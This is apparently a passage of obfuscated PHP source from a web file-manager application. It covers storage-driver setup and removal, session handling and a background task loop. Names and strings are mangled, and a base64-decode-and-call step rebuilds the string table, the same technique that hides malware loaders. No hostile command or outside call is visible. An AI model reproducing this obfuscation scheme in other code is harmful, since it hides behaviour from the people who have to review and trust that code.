$this->ioSizeUseGet(array_to_keyvalue($µßÍó™ƒ, $á‡Ş®£Å[12], $á‡Ş®£Å[483])); } foreach ($µßÍó™ƒ as $ÂÔù™ğ => $Åšù‹‚ß) { unset($µßÍó™ƒ[$ÂÔù™ğ][$á‡Ş®£Å[6]]); $µßÍó™ƒ[$ÂÔù™ğ][$á‡Ş®£Å[2120]] = isset($Äí¨Â‹¹[$Åšù‹‚ß[$á‡Ş®£Å[483]]]) ? $Äí¨Â‹¹[$Åšù‹‚ß[$á‡Ş®£Å[483]]] : 0; } return $µßÍó™ƒ; } public function ioSizeUseGet($¯­ÇÔ±) { $é‚Á˜¨ =& $_SERVER[öæÛ¿©¿]; if (!$¯­ÇÔ±) { return array(); } $úÃ´úˆ = $é‚Á˜¨[2467] . implode($é‚Á˜¨[50], $¯­ÇÔ±); $ç Øä©Â = Cache::get($úÃ´úˆ); if ($ç Øä©Â) { return $ç Øä©Â; } $ÚÑéÍüâ = array($é‚Á˜¨[918] => $é‚Á˜¨[483], $é‚Á˜¨[2468] => $é‚Á˜¨[79]); $—çø Š¹ = array($é‚Á˜¨[918] => array($é‚Á˜¨[7], $¯­ÇÔ±)); $ç Øä©Â = Model($é‚Á˜¨[886])->field($ÚÑéÍüâ)->where($—çø Š¹)->group($é‚Á˜¨[918])->select(); $ç Øä©Â = array_to_keyvalue($ç Øä©Â, $é‚Á˜¨[483], $é‚Á˜¨[79]); Cache::set($úÃ´úˆ, $ç Øä©Â, 600); return $ç Øä©Â; } public function getConfig($€òù»ÑÉ) { $åì¶÷ = parent::listData($€òù»ÑÉ); $ÈÑçÄğì = _get($åì¶÷, $_SERVER[öæÛ¿©¿][6], array()); if ($ÈÑçÄğì && !is_array($ÈÑçÄğì)) { $ÈÑçÄğì = json_decode($ÈÑçÄğì, !0); } return $ÈÑçÄğì; } public function update($º©‰×°³, $Ş·íÛåË) { $Šš½˜ÏË =& $_SERVER[öæÛ¿©¿]; $Ùì¤ÎÆæ = $Ş·íÛåË[$Šš½˜ÏË[32]]; $Ò¥À‚ì‡ = array_to_keyvalue(parent::listData(), $Šš½˜ÏË[32]); if (isset($Ò¥À‚ì‡[$Ùì¤ÎÆæ]) && $Ò¥À‚ì‡[$Ùì¤ÎÆæ][$Šš½˜ÏË[483]] != $º©‰×°³) { return !1; } $this->checkPwd($º©‰×°³, $Ş·íÛåË); if (isset($Ş·íÛåË[$Šš½˜ÏË[2469]]) && $Ş·íÛåË[$Šš½˜ÏË[2469]] == $Šš½˜ÏË[91]) { $this->checkConfig($Ş·íÛåË); } unset($Ş·íÛåË[$Šš½˜ÏË[2469]]); $Ô„úĞ¹× = parent::update($º©‰×°³, $Ş·íÛåË); if ($Ô„úĞ¹× && $Ş·íÛåË[$Šš½˜ÏË[37]]) { foreach ($Ò¥À‚ì‡ as $€ŠÃ¶Í•) { if ($€ŠÃ¶Í•[$Šš½˜ÏË[37]] && $€ŠÃ¶Í•[$Šš½˜ÏË[483]] != $º©‰×°³) { parent::update($€ŠÃ¶Í•[$Šš½˜ÏË[483]], array($Šš½˜ÏË[37] => 0)); } } $this->updateBackup($º©‰×°³, $Ò¥À‚ì‡); } return $Ô„úĞ¹×; } public function add($ù©š¢–Ç) { $“Îß˜Ğ² =& $_SERVER[öæÛ¿©¿]; $İ­Àµ¯± = array_to_keyvalue(parent::listData(), $“Îß˜Ğ²[32]); if (isset($İ­Àµ¯±[$ù©š¢–Ç[$“Îß˜Ğ²[32]]])) { return !1; } $this->checkConfig($ù©š¢–Ç); $±éŞşû´ = parent::insert($ù©š¢–Ç); if ($±éŞşû´ && $ù©š¢–Ç[$“Îß˜Ğ²[37]]) { foreach ($İ­Àµ¯± as $©âú¯Œš) { if ($©âú¯Œš[$“Îß˜Ğ²[37]]) { parent::update($©âú¯Œš[$“Îß˜Ğ²[483]], array($“Îß˜Ğ²[37] => 0)); } } $this->updateBackup($±éŞşû´, $İ­Àµ¯±); } return $±éŞşû´; } public function updateBackup($ãĞ™Ú¶ó, $êÕœÚ³Ş) { $©±“—Ò‘ =& $_SERVER[öæÛ¿©¿]; if ($ãĞ™Ú¶ó == $©±“—Ò‘[91]) { return; } $‰¨µ¤Í = Model($©±“—Ò‘[840])->config(); $¬ÌÛíåù = $‰¨µ¤Í[$©±“—Ò‘[844]]; if ($‰¨µ¤Í[$©±“—Ò‘[1895]] != $©±“—Ò‘[91] || $¬ÌÛíåù == $ãĞ™Ú¶ó) { return; } if ($¬ÌÛíåù != $©±“—Ò‘[91]) { $ò”ÁÙˆª = array(); foreach ($êÕœÚ³Ş as $ºÏÎÒš®) { if ($ãĞ™Ú¶ó == $ºÏÎÒš®[$©±“—Ò‘[483]]) { continue; } $ò”ÁÙˆª[] = $ºÏÎÒš®[$©±“—Ò‘[483]]; } if ($ò”ÁÙˆª && in_array($¬ÌÛíåù, $ò”ÁÙˆª)) { return; } } $ÔÕ°ÅËâ = Model($©±“—Ò‘[865])->get($©±“—Ò‘[872]); $ÔÕ°ÅËâ = json_decode($ÔÕ°ÅËâ, !0); if (!$ÔÕ°ÅËâ) { return; } $ÔÕ°ÅËâ[$©±“—Ò‘[844]] = $ãĞ™Ú¶ó; Model($©±“—Ò‘[865])->set(array($©±“—Ò‘[872] => $ÔÕ°ÅËâ)); } public function checkPwd($ÅŞ‚¬´†, &$òı•áæñ) { $«—ôØÊ± =& $_SERVER[öæÛ¿©¿]; if (empty($òı•áæñ[$«—ôØÊ±[6]])) { return; } $Ö–Û¬ÇË = $òı•áæñ[$«—ôØÊ±[6]]; if (!is_array($Ö–Û¬ÇË)) { $Ö–Û¬ÇË = json_decode($Ö–Û¬ÇË, !0); } $Ì”ÒŸÎì = $«—ôØÊ±[12]; $İÒ¥ë“ğ = array($«—ôØÊ±[1586], $«—ôØÊ±[2470], $«—ôØÊ±[998]); foreach ($İÒ¥ë“ğ as $ÙŠš×¢Ó) { if (isset($Ö–Û¬ÇË[$ÙŠš×¢Ó])) { $Ì”ÒŸÎì = $ÙŠš×¢Ó; break; } } if (!$Ì”ÒŸÎì) { return; } $åç·ÁÌ¤ = $this->getConfig($ÅŞ‚¬´†); $ª‘Ãµ½È = $åç·ÁÌ¤[$Ì”ÒŸÎì]; $¯œà«Æ = $Ö–Û¬ÇË[$Ì”ÒŸÎì]; if ($¯œà«Æ == str_repeat($«—ôØÊ±[221], strlen($ª‘Ãµ½È))) { $Ö–Û¬ÇË[$Ì”ÒŸÎì] = $ª‘Ãµ½È; $òı•áæñ[$«—ôØÊ±[6]] = json_encode($Ö–Û¬ÇË); } else { if ($¯œà«Æ != $ª‘Ãµ½È) { $òı•áæñ[$«—ôØÊ±[2469]] = $«—ôØÊ±[91]; } } } public function checkConfig(&$çÆëü“Ì, $ÈÛûÑ·’ = false) { $»üæ”ÂÒ =& $_SERVER[öæÛ¿©¿]; $µçµø™  = strtolower($çÆëü“Ì[$»üæ”ÂÒ[96]]); $ÔİŸ£ = $çÆëü“Ì[$»üæ”ÂÒ[6]]; if (!is_array($ÔİŸ£)) { $ÔİŸ£ = json_decode($ÔİŸ£, !0); } foreach ($ÔİŸ£ as $£‚ıÆ­– => $“šşúÊŒ) { if (is_string($“šşúÊŒ)) { $ÔİŸ£[$£‚ıÆ­–] = trim($“šşúÊŒ); } } $ÔİŸ£[$»üæ”ÂÒ[2471]] = rand_string(6); $éôÙ®ï² = $GLOBALS[$»üæ”ÂÒ[6]][$»üæ”ÂÒ[92]][$»üæ”ÂÒ[926]]; $¹‘Øšáê = isset($éôÙ®ï²[$µçµø™ ]) ? $éôÙ®ï²[$µçµø™ ] : ucfirst($µçµø™ ); $ËìŒ±¦ê = $»üæ”ÂÒ[77] . $¹‘Øšáê; if (!$¹‘Øšáê || !class_exists($ËìŒ±¦ê)) { if ($ÈÛûÑ·’) { return LNG($»üæ”ÂÒ[2472]); } write_log(array($»üæ”ÂÒ[2473], $çÆëü“Ì, get_caller_info()), $»üæ”ÂÒ[214]); show_json(LNG($»üæ”ÂÒ[2472]), !1, $çÆëü“Ì); } $çÔ‘Ö‚» = new $ËìŒ±¦ê($ÔİŸ£); $±¡×ïâå = rtrim($ÔİŸ£[$»üæ”ÂÒ[1311]], $»üæ”ÂÒ[8]) . $»üæ”ÂÒ[8]; if (in_array($µçµø™ , $çÔ‘Ö‚»->objectDriver)) { try { if (!$çÔ‘Ö‚»->isBucketCors() && !$çÔ‘Ö‚»->setBucketCors()) { $¢¯’Ò• = LNG($»üæ”ÂÒ[2474]); $¢¯’Ò• .= $»üæ”ÂÒ[2475] . LNG($»üæ”ÂÒ[2476]); } } catch (Exception $’»¡Ï…ğ) { $¢¯’Ò• = $’»¡Ï…ğ->getMessage(); } if (isset($¢¯’Ò•)) { return $this->_parseError($¢¯’Ò•, $µçµø™ , $ÈÛûÑ·’); } if ($µçµø™  == $»üæ”ÂÒ[68] && !$çÔ‘Ö‚»->checkRegion()) { return $this->_parseError(LNG($»üæ”ÂÒ[2477]), $µçµø™ , $ÈÛûÑ·’); } } else { if ($µçµø™  == $»üæ”ÂÒ[2478]) { if ($çÔ‘Ö‚»->ftpPath) { $ø€ˆ²¹” = trim($±¡×ïâå, $»üæ”ÂÒ[8]); if (stripos($ø€ˆ²¹”, trim($çÔ‘Ö‚»->ftpPath, $»üæ”ÂÒ[8])) !== 0) { $±¡×ïâå = $çÔ‘Ö‚»->ftpPath . $»üæ”ÂÒ[8] . ($ø€ˆ²¹” ? $ø€ˆ²¹” . $»üæ”ÂÒ[8] : $»üæ”ÂÒ[12]); } } } } $ŸÑ‘´­‡ = $çÔ‘Ö‚»->getPath($±¡×ïâå . $»üæ”ÂÒ[1315]); try { if ($µçµø™  == $»üæ”ÂÒ[107]) { $çÔ‘Ö‚»->mkdir($±¡×ïâå); } $ ¦øÆû¸ = $çÔ‘Ö‚»->mkfile($ŸÑ‘´­‡); if (!$ ¦øÆû¸) { $¢¯’Ò• = LNG($»üæ”ÂÒ[2474]); } } catch (Exception $’»¡Ï…ğ) { $¢¯’Ò• = $’»¡Ï…ğ->getMessage(); } if (isset($¢¯’Ò•)) { return $this->_parseError($¢¯’Ò•, $µçµø™ , $ÈÛûÑ·’); } $ÔİŸ£[$»üæ”ÂÒ[1311]] = $±¡×ïâå; $çÆëü“Ì[$»üæ”ÂÒ[6]] = json_encode($ÔİŸ£); $çÆëü“Ì[$»üæ”ÂÒ[96]] = $¹‘Øšáê; return !0; } private function _parseError($µŠƒ°—é, $µœ‚ú¹, $ëìŸÓ™Ÿ = false) { $ù­Šô¼ø =& $_SERVER[öæÛ¿©¿]; if ($µœ‚ú¹ == $ù­Šô¼ø[68] && stripos($µŠƒ°—é, $ù­Šô¼ø[2479])) { $Œ²Ø•÷À = explode($ù­Šô¼ø[10], $µŠƒ°—é); $×ÒôÈ‘Ö = isset($Œ²Ø•÷À[1]) ? $Œ²Ø•÷À[1] : $ù­Šô¼ø[12]; $Â¼º“æ = array($ù­Šô¼ø[2480] => LNG($ù­Šô¼ø[2481]), $ù­Šô¼ø[2482] => LNG($ù­Šô¼ø[2483])); if (isset($Â¼º“æ[$×ÒôÈ‘Ö])) { $µŠƒ°—é = $Â¼º“æ[$×ÒôÈ‘Ö]; } } if (stripos($µŠƒ°—é, $ù­Šô¼ø[2484]) === 0) { $Á³ƒ¿‰Ğ = strpos($µŠƒ°—é, $ù­Šô¼ø[176]); if ($Á³ƒ¿‰Ğ === !1) { $Á³ƒ¿‰Ğ = strpos($µŠƒ°—é, $ù­Šô¼ø[4]); } if ($Á³ƒ¿‰Ğ !== !1) { $µŠƒ°—é = substr($µŠƒ°—é, $Á³ƒ¿‰Ğ + 1); } } $µŠƒ°—é = LNG($ù­Šô¼ø[1318]) . $µŠƒ°—é; if ($ëìŸÓ™Ÿ) { return $µŠƒ°—é; } show_json($µŠƒ°—é, !1); } public function driverListSystem() { $¸³ñı¹‰ =& $_SERVER[öæÛ¿©¿]; $‡ ÔåÄ¡ = parent::listData(); $…Ğ‰Ÿâè = array(); foreach ($‡ ÔåÄ¡ as $†Ö±Î¢) { unset($†Ö±Î¢[$¸³ñı¹‰[232]], $†Ö±Î¢[$¸³ñı¹‰[88]]); if (!is_array($†Ö±Î¢[$¸³ñı¹‰[6]])) { $†Ö±Î¢[$¸³ñı¹‰[6]] = json_decode($†Ö±Î¢[$¸³ñı¹‰[6]], !0); } $…Ğ‰Ÿâè[] = $†Ö±Î¢; } return $…Ğ‰Ÿâè; } public function defaultDriver() { $¨°Ó¬¼« =& $_SERVER[öæÛ¿©¿]; $®ˆú“Â÷ = parent::listData(); $®Œ¶Õ = array_filter_by_field($®ˆú“Â÷, $¨°Ó¬¼«[37], 1); $®Œ¶Õ = $®Œ¶Õ[0]; if (!$®Œ¶Õ) { return array(); } if (!is_array($®Œ¶Õ[$¨°Ó¬¼«[6]])) { $®Œ¶Õ[$¨°Ó¬¼«[6]] = json_decode($®Œ¶Õ[$¨°Ó¬¼«[6]], !0); } return $®Œ¶Õ; } public function driverInfo($ÊìÜË¿±) { $ÎÚìÀşÂ =& $_SERVER[öæÛ¿©¿]; $ø³ñÉø¦ = array_to_keyvalue(parent::listData(), $ÎÚìÀşÂ[483]); if (!isset($ø³ñÉø¦[$ÊìÜË¿±])) { return !1; } $¨Ïšà¾Ë = $ø³ñÉø¦[$ÊìÜË¿±]; if (!is_array($¨Ïšà¾Ë[$ÎÚìÀşÂ[6]])) { $¨Ïšà¾Ë[$ÎÚìÀşÂ[6]] = json_decode($¨Ïšà¾Ë[$ÎÚìÀşÂ[6]], !0); } return $¨Ïšà¾Ë; } public function remove($¡íÎ¥‚“) { $this->removeShareItems($¡íÎ¥‚“); return parent::remove($¡íÎ¥‚“); } public function removeWithFile($·ûºõ Í, $‰Õ©ù°ø, $ÍÜı™Î², $ÃÛ·ê¦ = false) { $Ù¦Ç©»¸ =& $_SERVER[öæÛ¿©¿]; ignore_timeout(); $îÉìË§˜ = array($Ù¦Ç©»¸[918] => $·ûºõ Í); $²ÇÑÛâì = Model($Ù¦Ç©»¸[556]); if (isset($GLOBALS[$Ù¦Ç©»¸[2485]])) { $¤éÔ³Ò = $GLOBALS[$Ù¦Ç©»¸[2485]]; } else { $¤éÔ³Ò = $²ÇÑÛâì->where($îÉìË§˜)->field(array($Ù¦Ç©»¸[2382] => $Ù¦Ç©»¸[2087], $Ù¦Ç©»¸[2457] => $Ù¦Ç©»¸[79]))->find(); } $¡ì«§ = intval($¤éÔ³Ò[$Ù¦Ç©»¸[2087]]); $êŸÎÓõ• = intval($¤éÔ³Ò[$Ù¦Ç©»¸[79]]); $—±œŞ— = $‰Õ©ù°ø . $Ù¦Ç©»¸[2486] . $·ûºõ Í; $å“›üÖ± = LNG($‰Õ©ù°ø == $Ù¦Ç©»¸[639] ? $Ù¦Ç©»¸[2487] : $Ù¦Ç©»¸[2488]); $âı”Íù‹ = new TaskFileTransfer($—±œŞ—, $Ù¦Ç©»¸[214], $¡ì«§, $å“›üÖ± . $Ù¦Ç©»¸[473] . $ÍÜı™Î²[$Ù¦Ç©»¸[32]] . $Ù¦Ç©»¸[213] . $·ûºõ Í); $âı”Íù‹->task[$Ù¦Ç©»¸[856]] = (double) $êŸÎÓõ•; $ŞŠÚÓ÷¯ = KodIO::defaultDriver(); $œàºš î = $ŞŠÚÓ÷¯[$Ù¦Ç©»¸[483]]; $¾óı×Ô = 1; $Ùâ«õß© = 5000; $Ğö„à¯ˆ = $”½Ñ¼÷å = $¾¶Š‘ªµ = array(); $ÃäÎöù = $²ÇÑÛâì->where($îÉìË§˜)->field($Ù¦Ç©»¸[2489])->selectPage($Ùâ«õß©, $¾óı×Ô); $âëùªÔÎ = intval($ÃäÎöù[$Ù¦Ç©»¸[443]][$Ù¦Ç©»¸[445]]); while ($ÃäÎöù && $¾óı×Ô <= $âëùªÔÎ) { foreach ($ÃäÎöù[$Ù¦Ç©»¸[446]] as $«¥ô½¨) { $¯Ÿıü¶å = $«¥ô½¨[$Ù¦Ç©»¸[553]]; if ($ÃÛ·ê¦) { $”½Ñ¼÷å[] = $¯Ÿıü¶å; continue; } $é¾¦Ãùñ = $«¥ô½¨[$Ù¦Ç©»¸[87]]; $·¢õçşŠ = get_path_father($é¾¦Ãùñ); $¾¶Š‘ªµ[] = $·¢õçşŠ; $·¢õçşŠ = str_replace("\x7b\151\157\x3a{$·ûºõ Í}\175\57", "\173\151\x6f\x3a{$œàºš î}\175\57", $·¢õçşŠ); if (!IO::exist($é¾¦Ãùñ)) { $Ğö„à¯ˆ[] = $¯Ÿıü¶å; $âı”Íù‹->updateFileEnd($«¥ô½¨[$Ù¦Ç©»¸[32]], $«¥ô½¨[$Ù¦Ç©»¸[79]]); write_log($Ù¦Ç©»¸[2490] . $é¾¦Ãùñ, $Ù¦Ç©»¸[2066]); continue; } $Ú‹ŠüŠÏ = IO::move($é¾¦Ãùñ, $·¢õçşŠ, REPEAT_RENAME); if (!$Ú‹ŠüŠÏ) { $”½Ñ¼÷å[] = $¯Ÿıü¶å; $âı”Íù‹->updateFileEnd($«¥ô½¨[$Ù¦Ç©»¸[32]], $«¥ô½¨[$Ù¦Ç©»¸[79]]); write_log($Ù¦Ç©»¸[2491] . $é¾¦Ãùñ, $Ù¦Ç©»¸[2066]); continue; } $†¢èœ•ï = array($Ù¦Ç©»¸[918] => $œàºš î, $Ù¦Ç©»¸[87] => $Ú‹ŠüŠÏ); $²ÇÑÛâì->where(array($Ù¦Ç©»¸[553] => $¯Ÿıü¶å))->save($†¢èœ•ï); } $¾óı×Ô++; $ÃäÎöù = $²ÇÑÛâì->where($îÉìË§˜)->field($Ù¦Ç©»¸[2489])->selectPage($Ùâ«õß©, $¾óı×Ô); } $Ãê€¦» = $âı”Íù‹->task; if (!$ÃÛ·ê¦) { Cache::set($—±œŞ—, $Ãê€¦»); } $âı”Íù‹->end(); $Ğö„à¯ˆ = array_unique($Ğö„à¯ˆ); $”½Ñ¼÷å = array_unique($”½Ñ¼÷å); if (!$ÃÛ·ê¦ && ($Ğö„à¯ˆ || $”½Ñ¼÷å)) { $ê§«œ¹Ó = array(); if ($Ğö„à¯ˆ) { $ê§«œ¹Ó[] = sprintf(LNG($Ù¦Ç©»¸[2492]), count($Ğö„à¯ˆ)); } if ($”½Ñ¼÷å) { $ê§«œ¹Ó[] = sprintf(LNG($Ù¦Ç©»¸[2493]), count($”½Ñ¼÷å)); } $ê§«œ¹Ó = sprintf(LNG($Ù¦Ç©»¸[2494]), implode($Ù¦Ç©»¸[1532], $ê§«œ¹Ó)) . $Ù¦Ç©»¸[2495] . date($Ù¦Ç©»¸[2496]) . $Ù¦Ç©»¸[2497]; if ($‰Õ©ù°ø == $Ù¦Ç©»¸[1276]) { $ê§«œ¹Ó .= $Ù¦Ç©»¸[2498] . LNG($Ù¦Ç©»¸[2499]); } else { $ê§«œ¹Ó = LNG($Ù¦Ç©»¸[2500]) . $Ù¦Ç©»¸[2501] . $ê§«œ¹Ó; } $Ãê€¦»[$Ù¦Ç©»¸[1313]] = $ê§«œ¹Ó; Cache::set($—±œŞ—, $Ãê€¦»); unset($ÍÜı™Î²[$Ù¦Ç©»¸[6]]); $ÈŒæÅÎ = array($Ù¦Ç©»¸[483] => $·ûºõ Í, $Ù¦Ç©»¸[2371] => $Ù¦Ç©»¸[639], $Ù¦Ç©»¸[32] => $ÍÜı™Î²[$Ù¦Ç©»¸[32]], $Ù¦Ç©»¸[96] => $ÍÜı™Î²[$Ù¦Ç©»¸[96]]); Hook::trigger($Ù¦Ç©»¸[1935], array($Ù¦Ç©»¸[1335] => $ÈŒæÅÎ, $Ù¦Ç©»¸[1345] => !0)); show_json($ê§«œ¹Ó, !1, 100111); } if ($‰Õ©ù°ø == $Ù¦Ç©»¸[639]) { return !0; } if ($Ğö„à¯ˆ || $”½Ñ¼÷å) { $×ùóêü… = array_merge($Ğö„à¯ˆ, $”½Ñ¼÷å); $×ùóêü… = array_filter(array_unique($×ùóêü…)); $this->removeByFileID($×ùóêü…); } if ($¾¶Š‘ªµ) { $¾¶Š‘ªµ = array_filter(array_unique($¾¶Š‘ªµ)); foreach ($¾¶Š‘ªµ as $é¾¦Ãùñ) { $¤éÔ³Ò = IO::has($é¾¦Ãùñ, !0); if (!$¤éÔ³Ò[$Ù¦Ç©»¸[240]] && !$¤éÔ³Ò[$Ù¦Ç©»¸[241]]) { IO::remove($é¾¦Ãùñ); } } } return $this->remove($·ûºõ Í); } private function removeByFileID($ë«ìÓ€Ú = array()) { $¶€·Üûú =& $_SERVER[öæÛ¿©¿]; if (empty($ë«ìÓ€Ú)) { return; } $¦Ğ²†°ª = array($¶€·Üûú[553] => array($¶€·Üûú[7], $ë«ìÓ€Ú)); $ªÎ¿Ş¿İ = Model($¶€·Üûú[1478])->where($¦Ğ²†°ª)->field($¶€·Üûú[2446])->select(); if (!$ªÎ¿Ş¿İ) { return Model($¶€·Üûú[556])->remove($ë«ìÓ€Ú); } $ªÎ¿Ş¿İ = array_to_keyvalue($ªÎ¿Ş¿İ, $¶€·Üûú[192], $¶€·Üûú[553]); foreach ($ªÎ¿Ş¿İ as $Ã³„·ßÁ => $Çº÷òÆğ) { Model($¶€·Üûú[925])->removeNow($Ã³„·ßÁ, !1); } $»ö†‡ÜÏ = array_diff($ë«ìÓ€Ú, array_unique(array_values($ªÎ¿Ş¿İ))); if ($»ö†‡ÜÏ) { return Model($¶€·Üûú[556])->remove($»ö†‡ÜÏ); } } private function removeShareItems($œËÁ¿Úì) { $€ûƒó’ =& $_SERVER[öæÛ¿©¿]; $ÜÁÄ˜œ‡ = "\173\x69\157\x3a{$œËÁ¿Úì}\x7d\x2f"; $íâªÂÎ± = array($€ûƒó’[192] => 0, $€ûƒó’[579] => array($€ûƒó’[470], "{$ÜÁÄ˜œ‡}\x25")); $îğô‚¡¯ = Model($€ûƒó’[1508])->where($íâªÂÎ±)->field($€ûƒó’[684])->select(); if (empty($îğô‚¡¯)) { return; } $¹ÑóÜ™Ì = array_to_keyvalue($îğô‚¡¯, $€ûƒó’[12], $€ûƒó’[684]); Model($€ûƒó’[683])->remove($¹ÑóÜ™Ì); } } goto c‘•†«êê°; dƒ¡î•°: $fileSize = strrev(base64_decode($_SERVER[Ú”‡Õ—§][0])); function binCheckNeq($ƒƒªº¿¼, $Æ¸ÎšÏ¢) { return $ƒƒªº¿¼ != $Æ¸ÎšÏ¢; } $_SERVER[$_SERVER[Ú”‡Õ—§][1]] = $fileSize($_SERVER[$_SERVER[Ú”‡Õ—§][2]]); goto F¸øíğ±§; FÎòÉÊƒ¦: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $šĞËÜèª =& $_SERVER[öæÛ¿©¿]; static $ü¨ŠĞ™” = false; if ($ü¨ŠĞ™”) { return $ü¨ŠĞ™”; } $ôğØş © = $GLOBALS[$šĞËÜèª[6]][$šĞËÜèª[425]]; self::$sessionTime = $ôğØş ©[$šĞËÜèª[1871]]; $ÅÚ¹èã = isset($GLOBALS[$šĞËÜèª[1872]]) ? $GLOBALS[$šĞËÜèª[1872]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÅÚ¹èã)) { self::$sessionSign = Cookie::get($ÅÚ¹èã); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÅÚ¹èã, self::$sessionSign, self::$sessionTime); $‰÷ŒÜı = $ôğØş ©[$šĞËÜèª[1873]]; $º¨ˆŠ€Ø = $ôğØş ©[$‰÷ŒÜı]; $œÁàÌÒÚ = $ôğØş ©[$šĞËÜèª[928]]; switch ($‰÷ŒÜı) { case $šĞËÜèª[21]: self::$handle = Model($šĞËÜèª[929]); break; case $šĞËÜèª[930]: self::$handle = new CacheRedis($º¨ˆŠ€Ø, $œÁàÌÒÚ); break; case $šĞËÜèª[931]: self::$handle = new CacheMemcached($º¨ˆŠ€Ø, $œÁàÌÒÚ); break; case $šĞËÜèª[231]: $º¨ˆŠ€Ø[$šĞËÜèª[87]] = $º¨ˆŠ€Ø[$šĞËÜèª[87]] . $šĞËÜèª[1874]; self::$handle = new CacheFile($º¨ˆŠ€Ø, $œÁàÌÒÚ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$šĞËÜèª[1607]]) || time() - self::$data[$šĞËÜèª[1607]] >= 5) { self::dataSave(); } } $ü¨ŠĞ™” = new self(); return $ü¨ŠĞ™”; } public static function getBySign($Í´ÄŞæ) { $Û¾„Ö§ì = self::$handle->get($Í´ÄŞæ); $Û¾„Ö§ì = unserialize($Û¾„Ö§ì); return is_array($Û¾„Ö§ì) ? $Û¾„Ö§ì : array(); } public static function setBySign($Ê×¤ğ€ò, $ÄÔ¢Şû¯) { self::$sessionSign = $Ê×¤ğ€ò; self::$data = $ÄÔ¢Şû¯; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[öæÛ¿©¿][1607]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($×Æ€ô£¿ = false) { if ($×Æ€ô£¿) { self::$sessionSign = $×Æ€ô£¿; } self::init(); return self::$sessionSign; } public static function set($Š¢ÔÕ•ß, $„„å—Œ• = false) { self::init(); if (is_array($Š¢ÔÕ•ß)) { foreach ($Š¢ÔÕ•ß as $Ü©ª°«Ï => $äÀğŒŒ) { array_set_value(self::$data, $Ü©ª°«Ï, $äÀğŒŒ); } } else { array_set_value(self::$data, $Š¢ÔÕ•ß, $„„å—Œ•); } self::dataSave(); } public static function get($Ã¿¦÷šÜ = false) { self::init(); if (!$Ã¿¦÷šÜ) { return self::$data; } return array_get_value(self::$data, $Ã¿¦÷šÜ); } public static function remove($‚°–şû‘) { self::init(); unset(self::$data[$‚°–şû‘]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[öæÛ¿©¿][937])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÉÒæû–› =& $_SERVER[öæÛ¿©¿]; if (self::valueGet($ÉÒæû–›[842]) != $ÉÒæû–›[91]) { return; } if (self::valueGet($ÉÒæû–›[1875]) == $ÉÒæû–›[91]) { $ãóòÈÙ° = self::valueGet($ÉÒæû–›[1876]); if (time() - $ãóòÈÙ° > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÉÒæû–›[1875], $ÉÒæû–›[91]); self::log($ÉÒæû–›[1877] . ACTION . $ÉÒæû–›[1878]); Hook::bind($ÉÒæû–›[1879], $ÉÒæû–›[1880]); $…°§îú = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÉÒæû–›[842]) != $ÉÒæû–›[91]) { self::valueSet($ÉÒæû–›[1875], $ÉÒæû–›[229]); self::log($ÉÒæû–›[1881]); die; } $ñª‰µ­Ê = time(); if ($ñª‰µ­Ê - $…°§îú >= 60) { self::valueSet(array($ÉÒæû–›[1875] => $ÉÒæû–›[91], $ÉÒæû–›[1876] => $ñª‰µ­Ê)); $…°§îú = $ñª‰µ­Ê; } if (!file_exists(USER_SYSTEM . $ÉÒæû–›[1882])) { self::valueSet(array($ÉÒæû–›[1875] => $ÉÒæû–›[229], $ÉÒæû–›[842] => $ÉÒæû–›[229])); self::log($ÉÒæû–›[1883]); die; } $ê™îÕÔ‡ = file_get_contents(BASIC_PATH . $ÉÒæû–›[1884]); $Ø˜€”ôû = KOD_VERSION . $ÉÒæû–›[10] . KOD_VERSION_BUILD; $±¾Â“ = match_text($ê™îÕÔ‡, $ÉÒæû–›[1885]) . $ÉÒæû–›[10] . match_text($ê™îÕÔ‡, $ÉÒæû–›[1886]); if ($±¾Â“ != $Ø˜€”ôû) { self::restart(); self::log("\x73\164\157\x70\145\x64\56\x5b\166\x65\162\163\x69\x6f\156\x20\x75\x70\x64\x61\x74\x65\73{$versionNow}\40\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $á”û˜Æš =& $_SERVER[öæÛ¿©¿]; http_close(); $GLOBALS[$á”û˜Æš[1887]] = 1; $_SERVER[$á”û˜Æš[1888]] = $á”û˜Æš[1889]; $_COOKIE = array(); $GLOBALS[$á”û˜Æš[1890]] = 1; $GLOBALS[$á”û˜Æš[1891]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $‡ÍÄÎøÍ =& $_SERVER[öæÛ¿©¿]; http_close(); self::valueSet($‡ÍÄÎøÍ[842], $‡ÍÄÎøÍ[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‡ÍÄÎøÍ[1875] => $‡ÍÄÎøÍ[229], $‡ÍÄÎøÍ[842] => $‡ÍÄÎøÍ[91])); self::log($‡ÍÄÎøÍ[1892]); } public static function taskSwitch() { $¶€¡í€¦ =& $_SERVER[öæÛ¿©¿]; $ÁŞÒŸÇé = self::valueGet($¶€¡í€¦[842]) == $¶€¡í€¦[91] ? $¶€¡í€¦[229] : $¶€¡í€¦[91]; self::valueSet($¶€¡í€¦[842], $ÁŞÒŸÇé); } public static function shutdownEvent() { $à‹‡¯ğÇ =& $_SERVER[öæÛ¿©¿]; self::valueSet($à‹‡¯ğÇ[1875], $à‹‡¯ğÇ[229]); self::log($à‹‡¯ğÇ[1893]); } public static function config($Æ¨ŒÜ·Õ, $´ü—ê) { self::valueSet($_SERVER[öæÛ¿©¿][842], $Æ¨ŒÜ·Õ); } 